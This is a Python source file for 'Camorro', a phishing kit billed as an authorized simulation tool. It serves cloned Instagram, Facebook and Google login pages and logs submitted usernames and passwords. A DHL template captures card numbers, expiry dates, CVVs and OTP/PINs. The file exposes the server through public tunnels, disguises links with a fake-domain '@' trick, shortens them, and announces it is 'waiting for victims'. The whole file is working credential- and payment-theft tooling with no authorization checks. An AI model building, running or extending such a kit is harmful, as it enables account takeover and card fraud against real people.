#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════╗
║   CAMORRO v1.1 — Social-Engineering Framework   ║
║   Phishing simulation for authorized security   ║
║   assessments. Logs everything, no exfiltration.║
╚══════════════════════════════════════════════════╝
"""

import argparse
import json
import os
import random
import re
import string
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.abspath(__file__))
SITES = os.path.join(ROOT, "sites")
LOGS  = os.path.join(ROOT, "logs")

CURRENT_SITE = None

BANNER = """
   ___                              ___
  / __|__ _ _ __ ___  _ _ _  _ _ __ / _ \ _ _  __ _
 | (_ / _` | '_ ` _ \| '_| || | '_ \ (_) | ' \/ _` |
  \___\__,_| .__/ .__/|_|  \__/ .__/\___/|_||_\__,_|
           |_|  |_|          |_|   v1.1
"""

# ---------------------------------------------------------------------------
# TEMPLATES
# ---------------------------------------------------------------------------
TEMPLATES = {
    "instagram": {
        "domain": "instagram.com",
        "redirect": "https://www.instagram.com/accounts/login/",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title>
<style>
 body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
 .card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;max-width:350px;width:90%;padding:40px 30px;text-align:center}
 h1{font-size:36px;font-weight:300;letter-spacing:-1px;margin:0 0 26px}
 input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;box-sizing:border-box;font-size:14px}
 button{width:100%;padding:10px;margin-top:14px;background:#0095f6;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer}
</style></head><body>
<form class="card" method="POST" action="/login">
 <h1>Instagram</h1>
 <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="off" required>
 <input type="password" name="password" placeholder="Password" required>
 <button type="submit">Log in</button>
</form>
</body></html>""",
    },
    "facebook": {
        "domain": "facebook.com",
        "redirect": "https://www.facebook.com/login.php",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook</title>
<style>
 body{margin:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
 .card{background:#fff;border:none;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);max-width:396px;width:90%;padding:24px;text-align:center}
 h1{color:#1877f2;font-size:40px;font-weight:700;margin:0 0 6px}
 p{color:#606770;font-size:15px;margin:0 0 20px}
 input{width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:17px}
 button{width:100%;padding:13px;margin-top:10px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
</style></head><body>
<form class="card" method="POST" action="/login">
 <h1>facebook</h1>
 <p>Log in to Facebook</p>
 <input type="text" name="email" placeholder="Email or phone number" autocomplete="off" required>
 <input type="password" name="password" placeholder="Password" required>
 <button type="submit">Log In</button>
</form>
</body></html>""",
    },
    "google": {
        "domain": "accounts.google.com",
        "redirect": "https://accounts.google.com/signin/v2/identifier",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title>
<style>
 body{margin:0;font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
 .card{border:1px solid #dadce0;border-radius:8px;max-width:400px;width:90%;padding:48px 40px;text-align:center}
 .logo{font-size:22px;font-weight:500;margin-bottom:8px}
 .logo span{color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
 h2{font-size:24px;margin:16px 0 8px}
 p{color:#5f6368;font-size:14px;margin:0 0 28px}
 input{width:100%;padding:13px;margin:6px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;font-size:16px}
 button{width:100%;padding:11px;margin-top:24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer}
</style></head><body>
<form class="card" method="POST" action="/login">
 <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
 <h2>Sign in</h2>
 <p>Use your Google Account</p>
 <input type="text" name="email" placeholder="Email or phone" autocomplete="off" required>
 <input type="password" name="password" placeholder="Enter your password" required>
 <button type="submit">Next</button>
</form>
</body></html>""",
    },
    "generic": {
        "domain": "portal.example.com",
        "redirect": "https://example.com/",
        "html": """<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Secure Login</title>
<style>
 body{margin:0;font-family:Segoe UI,Arial,sans-serif;background:#eef2f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
 .card{background:#fff;border-radius:10px;box-shadow:0 10px 30px rgba(0,0,0,.12);max-width:380px;width:90%;padding:36px}
 h2{margin:0 0 4px;color:#1f2937}
 p{color:#6b7280;font-size:14px;margin:0 0 20px}
 input{width:100%;padding:12px;margin:8px 0;border:1px solid #d1d5db;border-radius:6px;box-sizing:border-box;font-size:14px}
 button{width:100%;padding:12px;margin-top:12px;background:#111827;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer}
</style></head><body>
<form class="card" method="POST" action="/login">
 <h2>Portal Login</h2>
 <p>Sign in to continue</p>
 <input type="text" name="username" placeholder="Username" autocomplete="off" required>
 <input type="password" name="password" placeholder="Password" required>
 <button type="submit">Sign In</button>
</form>
</body></html>""",
    },
    # قالب DHL — ملفه يوضع يدوياً في sites/dhl/index.html
    "dhl": {
        "domain": "dhl.com",
        "redirect": "https://www.dhl.com/it-it/home.html",
    },
}

# ---------------------------------------------------------------------------
# BUILD / VIEW LOGS
# ---------------------------------------------------------------------------
def build_sites():
    os.makedirs(SITES, exist_ok=True)
    os.makedirs(LOGS, exist_ok=True)
    for name, tpl in TEMPLATES.items():
        d = os.path.join(SITES, name)
        os.makedirs(d, exist_ok=True)
        idx = os.path.join(d, "index.html")
        if tpl.get("html"):
            with open(idx, "w", encoding="utf-8") as f:
                f.write(tpl["html"])
        elif not os.path.exists(idx):
            with open(idx, "w", encoding="utf-8") as f:
                f.write(
                    "<!DOCTYPE html><html><head><title>%s</title></head><body "
                    "style='font-family:sans-serif;display:flex;justify-content:center;"
                    "align-items:center;min-height:100vh'><h2 style='color:#888'>"
                    "Camorro: place your <code>sites/%s/index.html</code> here</h2>"
                    "</body></html>" % (name, name))

def view_logs(site):
    os.makedirs(LOGS, exist_ok=True)
    files = [f"{site}.jsonl"] if site != "all" else sorted(os.listdir(LOGS))
    total = 0
    for fn in files:
        path = os.path.join(LOGS, fn)
        if not os.path.isfile(path):
            continue
        print(f"\n=== {fn} ===")
        with open(path, encoding="utf-8") as f:
            for line in f:
                e = json.loads(line)
                total += 1
                print(f"[{e['time']}] {e['ip']} | step={e.get('step','login')} | {e['data']}")
    print(f"\n[+] Total entries: {total}")

# ---------------------------------------------------------------------------
# TERMINAL OUTPUT
# ---------------------------------------------------------------------------
def show_capture(entry):
    site, step, d = entry["site"], entry["step"], entry["data"]
    if not isinstance(d, dict):
        d = {}
    rows = []
    if site == "dhl" and step == "login":
        title = "💳 DHL — CARD DATA"
        rows = [("Card", d.get("card") or d.get("card_number") or "?"),
                ("Expiry", d.get("exp") or d.get("expiry") or "?"),
                ("CVV", d.get("cvv") or d.get("cvn") or "?"),
                ("Last4", d.get("last4") or "?")]
    elif site == "dhl" and step == "otp":
        title = "🔐 DHL — OTP / PIN"
        rows = [("Card", d.get("card") or "?"),
                ("OTP/PIN", d.get("otp") or d.get("pin") or "?")]
    else:
        title = f"🎣 {site.upper()} — CAPTURED"
        rows = [(k, str(v)) for k, v in d.items()]

    rows += [("IP", entry["ip"]),
             ("Time", entry["time"]),
             ("UA", (entry["ua"] or "-")[:60])]

    W = max(30, len(title) + 4)
    for k, v in rows:
        W = max(W, len(f"{k}: {v}"))

    bar = "═" * (W + 2)
    print("\n╔" + bar + "╗")
    print("║ " + title.ljust(W) + " ║")
    print("╠" + bar + "╣")
    for k, v in rows:
        print("║ " + f"{k}: {v}".ljust(W) + " ║")
    print("╚" + bar + "╝")
    print(f"[+] Saved -> {os.path.join(LOGS, f'{site}.jsonl')}")

# ---------------------------------------------------------------------------
# HTTP HANDLER
# ---------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        if "404" not in fmt % args:
            sys.stderr.write("[http] " + (fmt % args) + "\n")

    def _send(self, code, body, ctype="text/html; charset=utf-8", headers=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ("/", "/index.html"):
            idx = os.path.join(SITES, CURRENT_SITE, "index.html")
            with open(idx, "rb") as f:
                self._send(200, f.read())
        elif path == "/camorro/status":
            logfile = os.path.join(LOGS, f"{CURRENT_SITE}.jsonl")
            hits = sum(1 for _ in open(logfile, encoding="utf-8")) if os.path.exists(logfile) else 0
            self._send(200, json.dumps({"site": CURRENT_SITE, "hits": hits}),
                       ctype="application/json")
        else:
            self._send(404, b"Not Found")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)
        ctype = self.headers.get("Content-Type", "")
        try:
            if "json" in ctype:
                fields = json.loads(raw.decode("utf-8", "ignore") or "{}")
            else:
                body = raw.decode("utf-8", "ignore")
                fields = {k: v[0] for k, v in urllib.parse.parse_qs(body).items()}
        except Exception:
            fields = {}
        if not isinstance(fields, dict):
            fields = {"raw": str(fields)}

        step = urllib.parse.urlparse(self.path).path.strip("/") or "login"
        entry = {
            "time": datetime.now().isoformat(timespec="seconds"),
            "site": CURRENT_SITE,
            "step": step,
            "ip": self.client_address[0],
            "ua": self.headers.get("User-Agent", ""),
            "data": fields,
        }
        logfile = os.path.join(LOGS, f"{CURRENT_SITE}.jsonl")
        with open(logfile, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry) + "\n")

        sys.stdout.write("\a\a")   # تنبيه صوتي
        sys.stdout.flush()
        show_capture(entry)

        if "json" in ctype:
            self._send(200, json.dumps({"ok": True}), ctype="application/json")
        else:
            self._send(302, b"", headers={"Location": TEMPLATES[CURRENT_SITE]["redirect"]})

# ---------------------------------------------------------------------------
# TUNNEL + LINK MASKING
# ---------------------------------------------------------------------------
def start_tunnel(method, port):
    cmds = {
        "cloudflared":  ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        "ngrok":        ["ngrok", "http", str(port)],
        "serveo":       ["ssh", "-R", f"80:localhost:{port}", "serveo.net"],
        "localhostrun": ["ssh", "-R", f"80:localhost:{port}", "nokey@localhost.run"],
    }
    print(f"[*] Starting tunnel ({method}) ...")
    proc = subprocess.Popen(cmds[method], stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True, bufsize=1)
    url = [None]

    def reader():
        for line in proc.stdout:
            print(f"[tunnel] {line.rstrip()}")
            m = re.search(r"https?://[^\s'\"]+", line)
            if m and url[0] is None:
                u = m.group(0).rstrip(".,;)")
                if "localhost" not in u:
                    url[0] = u

    threading.Thread(target=reader, daemon=True).start()
    for _ in range(90):
        if url[0]:
            break
        time.sleep(1)
    return url[0]

def mask_link(tunnel_url, site):
    host = urllib.parse.urlparse(tunnel_url).netloc
    domain = TEMPLATES[site]["domain"]
    junk = "".join(random.choices(string.ascii_lowercase, k=5))
    return f"https://{domain}-secure-{junk}@{host}/"

def shorten(url):
    api = "https://is.gd/create.php?format=simple&url=" + urllib.parse.quote(url)
    try:
        with urllib.request.urlopen(api, timeout=10) as r:
            return r.read().decode().strip()
    except Exception:
        return url

# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="Camorro — phishing simulation framework")
    ap.add_argument("--site", "-s", help="template name (see --list)")
    ap.add_argument("--list", "-l", action="store_true", help="list available templates")
    ap.add_argument("--view", help="show captured logs: site name or 'all'")
    ap.add_argument("--port", "-p", type=int, default=8080)
    ap.add_argument("--tunnel", "-t", default="cloudflared",
                    choices=["cloudflared", "ngrok", "serveo", "localhostrun", "none"])
    ap.add_argument("--short", action="store_true", help="shorten the masked link via is.gd")
    args = ap.parse_args()

    print(BANNER)
    build_sites()

    if args.list:
        print("[+] Available templates:")
        for name, tpl in TEMPLATES.items():
            print(f"    - {name}  (redirects to {tpl['redirect']})")
        return

    if args.view:
        view_logs(args.view)
        return

    if not args.site:
        ap.error("use --site <name> (see --list)")

    if args.site not in TEMPLATES:
        print(f"[-] Unknown site '{args.site}'. Use --list")
        sys.exit(1)

    global CURRENT_SITE
    CURRENT_SITE = args.site

    server = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    print(f"[+] Camorro up on http://localhost:{args.port} (template: {args.site})")
    print(f"[+] Status endpoint: http://localhost:{args.port}/camorro/status")
    threading.Thread(target=server.serve_forever, daemon=True).start()

    if args.tunnel == "none":
        print(f"[+] Local only: http://localhost:{args.port}")
    else:
        url = start_tunnel(args.tunnel, args.port)
        if url:
            masked = mask_link(url, args.site)
            print(f"\n[+] Public URL : {url}")
            print(f"[+] Masked URL : {masked}")
            if args.short:
                print(f"[+] Short URL  : {shorten(masked)}")
        else:
            print("[-] Could not obtain tunnel URL (is the tunnel binary installed?)")

    print("\n[*] Waiting for victims... captured data will appear HERE in the terminal.")
    print("[*] Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Shutting down...")
        server.shutdown()

if __name__ == "__main__":
    main()
